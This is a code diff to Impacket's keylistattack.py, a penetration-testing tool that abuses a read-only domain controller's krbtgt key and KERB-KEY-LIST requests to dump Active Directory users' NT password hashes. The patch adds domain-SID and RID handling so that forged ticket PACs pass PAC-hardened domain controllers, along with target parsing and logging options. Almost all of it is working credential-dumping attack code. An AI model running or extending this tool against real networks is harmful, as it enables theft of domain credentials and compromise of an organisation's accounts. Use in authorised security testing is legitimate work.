@@ -1,7 +1,9 @@
 #!/usr/bin/env python
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# Copyright (C) 2023 Fortra. All rights reserved.
+# Copyright Fortra, LLC and its affiliated companies 
+#
+# All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -57,6 +59,7 @@ class KeyListDump:
         self.__kdcHost = options.dc_ip
         self.__rodc = options.rodcNo
         # self.__kvno = 1
+        self.__domainSid = options.domain_sid
         self.__enum = enum
         self.__targets = targets
         self.__full = options.full
@@ -94,6 +97,7 @@ class KeyListDump:
             self.connect()
             self.__remoteOps = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
             self.__remoteOps.connectSamr(self.__domain)
+            self.__domainSid = self.__remoteOps.getDomainSid()
             self.__keyListSecrets = KeyListSecrets(self.__domain, self.__remoteName, self.__rodc, self.__aesKeyRodc, self.__remoteOps)
             logging.info('Enumerating target users. This may take a while on large domains')
             if self.__full is True:
@@ -105,12 +109,20 @@ class KeyListDump:
             self.__keyListSecrets = KeyListSecrets(self.__domain, self.__remoteName, self.__rodc, self.__aesKeyRodc, None)
             targetList = self.__targets
 
+        if self.__domainSid is None:
+            logging.warning('No domain SID available; the ticket PAC will use a placeholder identity. '
+                            'PAC-hardened DCs may reject it -- provide -domain-sid in LIST mode.')
+
         logging.info('Dumping Domain Credentials (domain\\uid:[rid]:nthash)')
         logging.info('Using the KERB-KEY-LIST request method. Tickets everywhere!')
         for targetUser in targetList:
-            user = targetUser.split(":")[0]
+            user, _, ridStr = targetUser.rpartition(":") if ":" in targetUser else (targetUser, "", "")
+            try:
+                userRid = int(ridStr)
+            except ValueError:
+                userRid = None
             targetUserName = Principal('%s' % user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-            partialTGT, sessionKey = self.__keyListSecrets.createPartialTGT(targetUserName)
+            partialTGT, sessionKey = self.__keyListSecrets.createPartialTGT(targetUserName, userRid, self.__domainSid)
             fullTGT = self.__keyListSecrets.getFullTGT(targetUserName, partialTGT, sessionKey)
             if fullTGT is not None:
                 key = self.__keyListSecrets.getKey(fullTGT, sessionKey)
@@ -151,12 +163,18 @@ if __name__ == '__main__':
     parser.add_argument('-full', action='store_true', default=False, help='Run the attack against all domain users. '
                         'Noisy! It could lead to more TGS requests being rejected')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
+    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
 
     group = parser.add_argument_group('LIST option')
     group.add_argument('-domain', action='store', help='The fully qualified domain name (only works with LIST)')
     group.add_argument('-kdc', action='store', help='KDC HostName or FQDN (only works with LIST)')
-    group.add_argument('-t', action='store', help='Attack only the username specified (only works with LIST)')
-    group.add_argument('-tf', action='store', help='File that contains a list of target usernames (only works with LIST)')
+    group.add_argument('-t', action='store', help='Attack only the username specified, optionally as username:rid '
+                                                  '(only works with LIST)')
+    group.add_argument('-tf', action='store', help='File that contains a list of target usernames, one per line, '
+                                                   'optionally as username:rid (only works with LIST)')
+    group.add_argument('-domain-sid', action='store', help='Domain SID, used to build the ticket PAC (only works '
+                                                           'with LIST; obtained automatically via SAMR otherwise). '
+                                                           'Recommended against PAC-hardened DCs')
 
     group = parser.add_argument_group('authentication')
     group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='Use NTLM hashes to authenticate to SMB '
@@ -181,13 +199,7 @@ if __name__ == '__main__':
     options = parser.parse_args()
 
     # Init the example's logger theme
-    logger.init()
-
-    if options.debug is True:
-        logging.getLogger().setLevel(logging.DEBUG)
-        logging.debug(version.getInstallationPath())
-    else:
-        logging.getLogger().setLevel(logging.INFO)
+    logger.init(options.ts, options.debug)
 
     if options.rodcNo is None:
         logging.error("You must specify the RODC number (krbtgt_XXXXX)")
@@ -214,7 +226,7 @@ if __name__ == '__main__':
                     for line in f:
                         target = line.strip()
                         if target != '' and target[0] != '#':
-                            targets.append(target + ":" + "N/A")
+                            targets.append(target)
             except IOError as error:
                 logging.error("Could not open file: %s - %s", options.tf, str(error))
                 sys.exit(1)
